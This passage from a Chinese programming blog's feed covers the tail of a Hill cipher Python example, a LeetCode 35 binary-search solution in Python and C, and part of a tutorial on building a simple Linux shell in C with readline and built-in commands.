np.linalg.inv(A_list)</span><br><span class="line">K_int = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> K:</span><br><span class="line">    K_int.append([])</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> i:</span><br><span class="line">        K_int[<span class="number">-1</span>].append(int(round(j))) <span class="comment">#round用来四舍五入</span></span><br><span class="line">A_list_inverse = mod26(K_int)</span><br><span class="line"><span class="comment">#矩阵化</span></span><br><span class="line">A = np.array(mod26(A_list))</span><br><span class="line">A_inverse = np.array(A_list_inverse)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>): <span class="comment">#python矩阵模块的使用</span></span><br><span class="line">    select = input(<span class="string">"1,加密 2,解密："</span>)</span><br><span class="line">    s = input(<span class="string">"输入(逗号相隔)："</span>)</span><br><span class="line">    S_list = s.split(<span class="string">','</span>)</span><br><span class="line">    S_list_int = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> S_list:</span><br><span class="line">        S_list_int.append(int(i))</span><br><span class="line">    S = np.array(S_list_int)</span><br><span class="line">    <span class="keyword">if</span> select == <span class="string">'1'</span>:</span><br><span class="line">        OUT = np.dot(S,A)</span><br><span class="line">        OUT_list = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> OUT:</span><br><span class="line">            OUT_list.append(i%<span class="number">26</span>)</span><br><span class="line">        print(OUT_list)</span><br><span class="line">    <span class="keyword">elif</span> select == <span class="string">'2'</span>:</span><br><span class="line">        OUT = np.dot(S,A_inverse)</span><br><span class="line">        OUT_list = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> OUT:</span><br><span class="line">            OUT_list.append(i%<span class="number">26</span>)</span><br><span class="line">        print(OUT_list)</span><br></pre></td></tr></table></figure>

<p><strong>解析：</strong></p>
<p>对矩阵取模函数：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mod26</span><span class="params">(A)</span>:</span></span><br><span class="line">    B = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> A:</span><br><span class="line">        B.append([])</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> i:</span><br><span class="line">            j %= <span class="number">26</span></span><br><span class="line">            B[<span class="number">-1</span>].append(j)<span class="comment">#加入到B新增的元素中，该元素为1*n矩阵</span></span><br><span class="line">    <span class="keyword">return</span> B</span><br></pre></td></tr></table></figure>

<p>A为n*n矩阵，for i in A 则遍历n次，</p>
<p>每次i为1*n矩阵，用for j in i 遍历i，对j取模26，在加入B中。</p>
]]></content>
      <categories>
        <category>密码学</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>古典密码</tag>
      </tags>
  </entry>
  <entry>
    <title>LeetCode题解35</title>
    <url>/2020/01/23/LeetCode%E9%A2%98%E8%A7%A335/</url>
    <content><![CDATA[<h1 id="LeetCode题解"><a href="#LeetCode题解" class="headerlink" title="LeetCode题解"></a>LeetCode题解</h1><p><strong>第35题，搜索插入位置</strong></p>
<p>给定一个排序数组和一个目标值，在数组中找到目标值，并返回其索引。如果目标值不存在于数组中，返回它将会被按顺序插入的位置。</p>
<p>你可以假设数组中无重复元素。</p>
<blockquote>
<p>示例 1:</p>
<p>输入: [1,3,5,6], 5<br>输出: 2</p>
<p>示例 2:</p>
<p>输入: [1,3,5,6], 2<br>输出: 1</p>
<p>示例 3:</p>
<p>输入: [1,3,5,6], 7<br>输出: 4</p>
<p>示例 4:</p>
<p>输入: [1,3,5,6], 0<br>输出: 0</p>
</blockquote>
<a id="more"></a>

<p>原题如上，代码如下：</p>
<p><strong>python版本</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">searchInsert</span><span class="params">(self, nums, target)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type nums: List[int]</span></span><br><span class="line"><span class="string">        :type target: int</span></span><br><span class="line"><span class="string">        :rtype: int</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        start = <span class="number">0</span></span><br><span class="line">        end = len(nums) - <span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span> start + <span class="number">1</span> &lt; end :</span><br><span class="line">            mid = int((start + end)/<span class="number">2</span>)</span><br><span class="line">            <span class="keyword">if</span> nums[mid] &lt;= target : </span><br><span class="line">                start = mid</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                end = mid</span><br><span class="line">        <span class="keyword">if</span> nums[start] &gt;= target :</span><br><span class="line">            <span class="keyword">return</span> start</span><br><span class="line">        <span class="keyword">if</span> nums[end] &gt;= target :</span><br><span class="line">            <span class="keyword">return</span> end</span><br><span class="line">        <span class="keyword">return</span> end+<span class="number">1</span></span><br></pre></td></tr></table></figure>

<p><img src="https://s2.ax1x.com/2020/01/23/1V3BHs.png" alt="1V3BHs.png"></p>
<p><strong>c语言版本</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">searchInsert</span><span class="params">(<span class="keyword">int</span>* nums, <span class="keyword">int</span> numsSize, <span class="keyword">int</span> target)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> start = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> <span class="built_in">end</span> = numsSize - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>(start + <span class="number">1</span> &lt; <span class="built_in">end</span>)&#123;</span><br><span class="line">        <span class="keyword">int</span> mid = (start + <span class="built_in">end</span>)/<span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span>(nums[mid] &lt;= target)&#123;</span><br><span class="line">            start = mid;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">end</span> = mid;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(nums[start] &gt;= target)&#123;</span><br><span class="line">        <span class="keyword">return</span> start;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(nums[<span class="built_in">end</span>] &gt;= target)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">end</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">end</span>+<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.ax1x.com/2020/01/23/1V8aPx.png" alt="1V8aPx.png"></p>
<p><strong>解析：</strong></p>
<p>使用二分法查找：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span>(start + <span class="number">1</span> &lt; <span class="built_in">end</span>)&#123;</span><br><span class="line">    <span class="keyword">int</span> mid = (start + <span class="built_in">end</span>)/<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">if</span>(nums[mid] &lt;= target)&#123;</span><br><span class="line">        start = mid;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">       	<span class="built_in">end</span> = mid;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用mid将范围区间不断缩小，最后使其定位到[start，end]之间，其中end = start + 1。</p>
<p>循环条件为start + 1 &lt; end ，等价于 start + 1 != end。</p>
<p>已知有序数组nums和target。则存在多种情况：</p>
<ol>
<li><p>target &lt; nums[0]</p>
<p>则此时start = 0 ，end = 1</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(nums[start] &gt;= target)&#123;</span><br><span class="line">    <span class="keyword">return</span> start;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>则返回 0。</p>
</li>
<li><p>target = nums[i]</p>
<p>则此时start = i，end = i + 1</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(nums[start] &gt;= target)&#123;</span><br><span class="line">    <span class="keyword">return</span> start;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>则返回 i。</p>
</li>
<li><p>target &gt; nums[i]   target &lt; nums[i+1]</p>
<p>则此时start = i，end = i + 1</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(nums[<span class="built_in">end</span>] &gt;= target)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">end</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>则返回 i + 1。</p>
</li>
<li><p>target &gt; nums[numsSize - 1]</p>
<p>则此时start = numsSize - 2，end = numsSize - 1</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="built_in">end</span>+<span class="number">1</span>;</span><br></pre></td></tr></table></figure>

<p>则返回numsSize。</p>
</li>
</ol>
]]></content>
      <categories>
        <category>LeetCode题解</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>c语言</tag>
      </tags>
  </entry>
  <entry>
    <title>在Linux环境下用c实现简易shell程序</title>
    <url>/2020/01/22/%E5%9C%A8Linux%E7%8E%AF%E5%A2%83%E4%B8%8B%E7%94%A8c%E5%AE%9E%E7%8E%B0%E7%AE%80%E6%98%93shell%E7%A8%8B%E5%BA%8F/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>​        这学期学校开设了操作系统的课程，但是内容比较浅显基础，我认为操作系统作为程序员的基本功之一，比较重要，也就想自己多学点，就想用<strong>c语言</strong>写一个在<strong>linux操作系统</strong>上的<strong>shell</strong>，顺便复习一下大一学的c语言，也在用<strong>《c和指针》</strong>去复习，不得不说，这本书确实写的不错，当然，对初学者不是那么友好，有一定基础的人可以去看，很不错。</p>
<p>最后，这篇文章里的代码可以在<a href="https://gitee.com/BMooS/myshell" target="_blank" rel="noopener">这里</a> (gitee)或者<a href="https://github.com/BMooS/master" target="_blank" rel="noopener">这里</a> (github)看到。</p>
<p>顺便说一下，作者再写这个程序时候只是一个在读学生，有些错误和粗浅之处，欢迎大家指正，谢谢大家。</p>
<a id="more"></a>

<h1 id="如何实现shell-以及整体框架"><a href="#如何实现shell-以及整体框架" class="headerlink" title="如何实现shell 以及整体框架"></a>如何实现shell 以及整体框架</h1><p>​        首先让我们明白一个shell的<strong>生命周期</strong>，任何事物都有自己的生命周期，shell自然也不例外。</p>
<p>我们启动终端，终端就开始加载shell程序，</p>
<ul>
<li><p><strong>首先</strong> shell会有自己的初始化，即加载并执行配置文件，这些配置会改变shell的行为</p>
</li>
<li><p><strong>然后</strong> shell程序启动，不断从标准输入中读取内容，并试图理解和执行这些内容</p>
</li>
<li><p><strong>最后</strong> 当所有命令完成后，控制shell程序关闭，并自动清除内存，自然退出</p>
</li>
</ul>
<p>  <em>这样的程序描述自然过于简单，正常且普遍的shell的程序执行自然比这个复杂，但大体是这样的一个流程。</em></p>
<p>  接下来我们简易去实现这个框架</p>
  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">//配置文件</span></span><br><span class="line">    <span class="comment">//循环运行执行程序</span></span><br><span class="line">    my_shell_loop();</span><br><span class="line">    <span class="comment">//shell程序退出</span></span><br><span class="line">    <span class="keyword">return</span> EXIT_SUCCESS</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>这里我们用循环去实现shell程序的主体部分，但shell程序不仅仅只有循环。</p>
<h1 id="具体细节"><a href="#具体细节" class="headerlink" title="具体细节"></a>具体细节</h1><h2 id="loop循环梗概"><a href="#loop循环梗概" class="headerlink" title="loop循环梗概"></a>loop循环梗概</h2><p>​        接下来让我们探讨loop循环的实现</p>
<p>​        shell程序在执行中不断<strong>读取</strong>标准输入中的内容，并加以<strong>分析执行</strong>，最后反馈给用户。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">loop</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *<span class="built_in">line</span>;</span><br><span class="line">    <span class="keyword">int</span> state = <span class="number">1</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">do</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"myshell -&gt; "</span>);</span><br><span class="line">        <span class="comment">//读取标准输入中的内容，保存在line里面</span></span><br><span class="line">        <span class="built_in">line</span> = shell_readline();</span><br><span class="line">        <span class="comment">//分析并加以执行</span></span><br><span class="line">        state = execute_line(<span class="built_in">line</span>);</span><br><span class="line">    &#125;<span class="keyword">while</span>(state);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="命令读入"><a href="#命令读入" class="headerlink" title="命令读入"></a>命令读入</h2><p>​        这里我们自己写入一个readline函数，具体分析程序是如何运作的。</p>
<p><strong>注意</strong> 这里我们引入了动态内存，因为我们不可能限制并给定用户的输入长度，用户输入的字符串长度是未知的，所以这里使用动态内存来储存字符串。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">shell_readline</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> bufsize = <span class="number">1024</span>; <span class="comment">//初始给定1024字符的长度</span></span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">char</span> *<span class="built_in">buffer</span> = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">char</span>)*bufsize);<span class="comment">//缓存区里开辟bufsize大小的内存</span></span><br><span class="line">    <span class="keyword">int</span> c;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">buffer</span>)&#123; <span class="comment">//检查返回值</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"allocation error\n"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        c = getchar();</span><br><span class="line">        <span class="keyword">if</span>(c == EOF || c == <span class="string">'\n'</span>)&#123;</span><br><span class="line">            <span class="built_in">buffer</span>[i] = <span class="string">'\0'</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">buffer</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">buffer</span>[i] = c;</span><br><span class="line">            i++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(i &gt;= bufsize)&#123; <span class="comment">//当现有字符串数量大于bufsize时，重新分配2倍大小的内存空间</span></span><br><span class="line">            bufsize += bufsize;</span><br><span class="line">            <span class="built_in">buffer</span> = <span class="built_in">realloc</span>(<span class="built_in">buffer</span>, <span class="keyword">sizeof</span>(<span class="keyword">char</span>)*bufsize);</span><br><span class="line">            <span class="keyword">if</span>(!<span class="built_in">buffer</span>)&#123; <span class="comment">//检查返回指针</span></span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"allocation error\n"</span>);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>注意</strong> 在使用动态内存的时候一定要<strong>小心</strong>以下几点</p>
<ul>
<li>调用malloc函数和realloc函数的时候要检查返回值，因为当申请新内存而现有资源不够的时候，就会返回NULL, 这是一个“null pointer”（空指针）</li>
<li>当然调用realloc函数时候，传递参值的时候也要小心，不要传递一个NULL，也不要传递一个非动态内存返回的指针</li>
<li>最后，<strong>一定一定</strong>注意内存的回收，即调用free()函数，回收动态内存空间，free函数的参值也是一个动态内存返回的指针，如果不回收动态内存，编译器不会报错，但是会造成<strong>内存泄漏</strong>，这是要极力避免的事情</li>
</ul>
<p>这样就简易实现了一个readline函数，简单且实用，但是我们想要实现bash，zsh这些著名shell里，可以使用上下键调用历史命令，可以用tab键补全命令这些功能就有些无力了，好在我们有现成的轮子可以套用，那就是readline库。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;readline/history.h&gt;</span></span></span><br><span class="line"><span class="built_in">line</span> = readline(<span class="string">"Myshell -&gt; "</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">line</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"allocation error\n"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">add_history(<span class="built_in">line</span>);</span><br><span class="line"><span class="built_in">free</span>(<span class="built_in">line</span>);</span><br></pre></td></tr></table></figure>

<p><strong>注意：</strong> </p>
<ul>
<li><p>readline库是一个<strong>动态连接库</strong>，gcc编译时候需要动态链接，使用一下指令即可： </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gcc main.c -lreadline</span><br></pre></td></tr></table></figure>
</li>
<li><p>readline函数返回值是一个指针，指向一个动态内存区域，也需要判别是否为NULL以及使用free函数释放掉，防止内存泄漏</p>
</li>
<li><p>作者在这里只是很粗浅的使用，只是用了add_history()函数用于添加历史指令，readline函数有更高阶的操作，具体在这里<a href="https://tiswww.case.edu/php/chet/readline/readline.html" target="_blank" rel="noopener">官方文档</a>(注：需要一点科学上网手段)</p>
</li>
</ul>
<p>  在这里，作者发现原始的颜色太单调，我们可以调制一些颜色对于shell提示输入符：</p>
  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CLOSE <span class="meta-string">"\001\033[0m\002"</span>                 <span class="comment">// 关闭所有属性</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BLOD  <span class="meta-string">"\001\033[1m\002"</span>                 <span class="comment">// 强调、加粗、高亮</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BEGIN(x,y) <span class="meta-string">"\001\033["</span>#x<span class="meta-string">";"</span>#y<span class="meta-string">"m\002"</span>	<span class="comment">// x: 背景，y: 前景</span></span></span><br><span class="line"></span><br><span class="line"> <span class="built_in">line</span> = readline(BEGIN(<span class="number">49</span>, <span class="number">34</span>)<span class="string">"Myshell-&gt;  "</span>CLOSE);<span class="comment">//使用一点宏定义简化一些复杂性</span></span><br></pre></td></tr></table></figure>

<p>效果如下：</p>
<p><img src="https://i.loli.net/2019/12/15/78nbjUHFfsIBSQZ.png" alt="UTOOLS1576411800363.png"></p>
<p>这样就好看多了</p>
<h2 id="命令解析"><a href="#命令解析" class="headerlink" title="命令解析"></a>命令解析</h2><p>​        现在我们来构造<strong>execute_line()</strong>函数。</p>
<p>​         对于在shell里面输入一个命令，不仅有<strong>内部命令</strong>，即写入程序代码中的命令，和<strong>外部命令</strong>，即shell要fork一个新进程，进程去系统path中寻找可执行的程序去解析命令。还有对一个命令语句来说，有<strong>命令部分</strong>，还有<strong>参数部分</strong>，而我们要做的就是将一条命令语句中的参数和命令分开并处理。</p>
<p>​        即：</p>
<p>​                我们要在<strong>execute_line()</strong>构造<strong>cut_line()</strong>和<strong>execute()</strong>两个函数去实现。</p>
<h3 id="cut-line"><a href="#cut-line" class="headerlink" title="cut_line()"></a>cut_line()</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> **<span class="title">cut_line</span><span class="params">(<span class="keyword">char</span> *<span class="built_in">line</span>)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> bufsize = <span class="number">64</span>, i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">char</span> **tokens = <span class="built_in">malloc</span>(bufsize*<span class="keyword">sizeof</span>(<span class="keyword">char</span>*));</span><br><span class="line">    <span class="keyword">char</span> *token;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!tokens)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"allocation error\n"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125; </span><br><span class="line">    token = strtok(<span class="built_in">line</span>, <span class="string">" "</span>);</span><br><span class="line">    <span class="keyword">while</span> (token != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        tokens[i] = token;</span><br><span class="line">        i++;</span><br><span class="line">        <span class="keyword">if</span>(i &gt;= bufsize)&#123;</span><br><span class="line">            bufsize += bufsize;</span><br><span class="line">            tokens = <span class="built_in">realloc</span>(tokens, bufsize*<span class="keyword">sizeof</span>(<span class="keyword">char</span>*));</span><br><span class="line">            <span class="keyword">if</span>(!tokens)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"allocation error\n"</span>);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        token = strtok(<span class="literal">NULL</span>, <span class="string">" "</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    tokens[i] = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">return</span> tokens;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​        在这里我们先申请了一个字符指针的指针，大小为64个单位，用来保存一个字符串数组。</p>
<p>​        在cut_line()中我们用C 标准库<strong>&lt;string.h&gt;</strong>中<strong>strtok()</strong>函数：</p>
<blockquote>
<p>C 库函数</p>
<p><strong>char *strtok(char *str, const char *delim)</strong></p>
<p>分解字符串 <strong>str</strong> 为一组字符串，<strong>delim</strong> 为分隔符。</p>
<p>该函数返回被分解的第一个子字符串，如果没有可检索的字符串，则返回一个空指针。</p>
</blockquote>
<p><strong>实例</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">   <span class="keyword">char</span> str[<span class="number">80</span>] = <span class="string">"This is - BMooS - shell"</span>;</span><br><span class="line">   <span class="keyword">const</span> <span class="keyword">char</span> s[<span class="number">2</span>] = <span class="string">"-"</span>;</span><br><span class="line">   <span class="keyword">char</span> *token;</span><br><span class="line">   </span><br><span class="line">   <span class="comment">/* 获取第一个子字符串 */</span></span><br><span class="line">   token = strtok(str, s);</span><br><span class="line">   </span><br><span class="line">   <span class="comment">/* 继续获取其他的子字符串 */</span></span><br><span class="line">   <span class="keyword">while</span>( token != <span class="literal">NULL</span> ) &#123;</span><br><span class="line">      <span class="built_in">printf</span>( <span class="string">"%s\n"</span>, token );</span><br><span class="line">    </span><br><span class="line">      token = strtok(<span class="literal">NULL</span>, s);</span><br><span class="line">   &#125;</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">return</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行结果：</p>
<blockquote>
<p>This is</p>
<p>BMooS</p>
<p>shell</p>
</blockquote>
<p><strong>注意：</strong></p>
<ol>
<li>还是和上述一样，在动态分配内存的的时候注意是否分配成功以及分配的多少，这里我采用的是几何倍数增长大小需求。</li>
<li>在生成字符串数组的时候，记住在末尾加入空指针<strong>NULL</strong>。</li>
<li>cut_line()函数返回的是一个指向动态内存空间的指针，主要在外部调用的时候配合free()函数使用。</li>
</ol>
<h3 id="execute"><a href="#execute" class="headerlink" title="execute()"></a>execute()</h3><p>​        execute()函数接受上面cut_line()函数的<strong>返回值</strong>，即execute()函数的参数是一个字符串数组，从变量类型上说，就是字符指针的指针。</p>
<p>​        这里我们在构造的时候要想到<strong>对命令的提取</strong>，<strong>对命令的识别</strong>以及<strong>对命令的执行</strong>。我们上述说到，对一个命令来说，我们识别它是一个内部命令还是一个外部命令，以便对命令<strong>区分执行</strong>。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">execute</span><span class="params">(<span class="keyword">char</span> **char_list)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">if</span>(char_list[<span class="number">0</span>] == <span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; long_cmd(); i++)&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">strcmp</span>(char_list[<span class="number">0</span>], cmder[i]) == <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> (*funcs[i])(char_list); </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">process</span>(char_list);<span class="comment">//调用进程</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>逻辑结构</strong></p>
<p>​        这里我们在构造execute()函数的时候我们对<strong>char_list[0]</strong>进行判空，不为空即有命令，我们要遍历我们在shell程序中编写的<strong>内部命令函数</strong>，看输入命令是否于其中内部命令匹配，若不匹配，则为外部命令，这时我们要调用我们编写的<strong>process()</strong>单独执行。</p>
<p><strong>内部命令</strong></p>
<p>​        我们这里需要构造一个字符串数组和一个自定义函数以及一个转换表：</p>
<ol>
<li>内部命令列表</li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">char</span> *cmder[] = &#123;</span><br><span class="line">    <span class="string">"cd"</span>,</span><br><span class="line">    <span class="string">"pwd"</span>,</span><br><span class="line">    <span class="string">"help"</span>,</span><br><span class="line">    <span class="string">"exit"</span>,</span><br><span class="line">    <span class="string">"echo"</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>返回内部命令列表长度的整型函数</li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">long_cmd</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">sizeof</span>(cmder)/<span class="keyword">sizeof</span>(<span class="keyword">char</span>*);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>转换表—函数指针数组</li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> (*funcs[])(<span class="keyword">char</span>**) = &#123;</span><br><span class="line">    &amp;fun_cd,</span><br><span class="line">    &amp;fun_pwd,</span><br><span class="line">    &amp;fun_help,</span><br><span class="line">    &amp;fun_exit,</span><br><span class="line">    &amp;fun_echo</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>​        <strong>内部命令是编写在shell程序里面的，是自定义的，我们对它们起名也是自定义的。</strong></p>
<p>​        <strong>注意：函数声明要在转换表之前</strong></p>
<p>现在让我们开始编写内部命令：</p>
<ol>
<li><strong>cd</strong>命令</li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fun_cd</span><span class="params">(<span class="keyword">char</span>** char_list)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(char_list[<span class="number">1</span>] == <span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Please enter the correct directory\n"</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(chdir(char_list[<span class="number">1</span>]) != <span class="number">0</span>)&#123;</span><br><span class="line">            perror(<span class="string">"myshell"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用系统函数<strong>chdir()</strong>改变当前工作目录  </p>
<p>函数说明：</p>
<ol>
<li>用户将当前的工作目录改变成以参数路径所指的目录。</li>
<li>使用头文件 unistd.h。</li>
<li>chdir()函数返回值执行成功则返回0，失败返回-1，errno为错误代码。</li>
</ol>
<ol start="2">
<li><strong>pwd</strong>命令</li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fun_pwd</span><span class="params">(<span class="keyword">char</span>** char_list)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> bufsize = <span class="number">1024</span>;</span><br><span class="line">    <span class="keyword">char</span> *<span class="built_in">buffer</span> = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">char</span>)*bufsize);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">buffer</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"allocation error1\n"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(getcwd(<span class="built_in">buffer</span>, bufsize) == <span class="literal">NULL</span>)&#123;</span><br><span class="line">            bufsize += bufsize;</span><br><span class="line">            <span class="built_in">buffer</span> = <span class="built_in">realloc</span>(<span class="built_in">buffer</span>, <span class="keyword">sizeof</span>(<span 